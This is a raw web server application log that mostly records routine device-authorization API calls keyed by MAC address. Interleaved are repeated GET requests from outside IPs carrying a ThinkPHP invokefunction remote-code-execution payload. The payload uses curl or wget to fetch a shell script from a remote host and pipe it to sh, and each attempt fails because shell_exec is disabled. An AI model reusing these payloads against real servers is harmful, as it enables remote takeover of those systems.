---------------------------------------------------------------
[ 2020-02-20T08:04:28+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T08:04:33+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T08:43:58+08:00 ] 39.144.18.146 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FA7B8700AC59"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T09:26:35+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T09:26:40+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T09:26:52+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T09:53:33+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T10:49:28+08:00 ] 218.204.253.161 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"D3D67CFC2865"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T10:56:45+08:00 ] 218.204.253.161 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"D3D67CFC2865"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T11:40:40+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T13:30:14+08:00 ] 223.104.255.77 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"E92960A8BC9D"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T14:13:24+08:00 ] 117.132.193.24 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"E3029E0D84DA"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T15:01:14+08:00 ] 223.104.255.172 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C16B8BD3EC7D"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T15:03:57+08:00 ] 223.104.255.172 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C16B8BD3EC7D"}
[ info ] queryauth response: 
[ info ] 0
---------------------------------------------------------------
[ 2020-02-20T15:05:07+08:00 ] 221.178.126.18 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"D72B441E601A"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T15:13:17+08:00 ] 221.178.124.46 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"FD27AD19F3CB"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T15:21:44+08:00 ] 223.104.255.77 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"E92960A8BC9D"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T15:22:48+08:00 ] 223.104.255.77 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"E92960A8BC9D"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T17:28:25+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C85FD234721F"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T17:28:29+08:00 ] 221.178.125.32 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C85FD234721F"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T17:36:19+08:00 ] 218.204.252.122 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"D68156CDD97D"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T17:45:36+08:00 ] 67.205.141.92 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T17:45:39+08:00 ] 159.65.158.91 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T20:13:26+08:00 ] 193.187.174.104 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T20:52:34+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T20:52:35+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T22:01:12+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:01:18+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:01:23+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:01:28+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:01:34+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:01:44+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:02:06+08:00 ] 218.204.252.153 POST /api/Bedorder/queryauth
[ info ] queryauth request: 
[ info ] {"mac":"C8F0C64C482C"}
[ info ] queryauth response: 
[ info ] 1
---------------------------------------------------------------
[ 2020-02-20T22:47:29+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T22:47:30+08:00 ] 194.87.103.156 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T23:47:01+08:00 ] 193.187.174.104 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
---------------------------------------------------------------
[ 2020-02-20T23:47:03+08:00 ] 193.187.174.104 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20217.12.221.244/t.sh|sh
[ error ] [2]shell_exec() has been disabled for security reasons
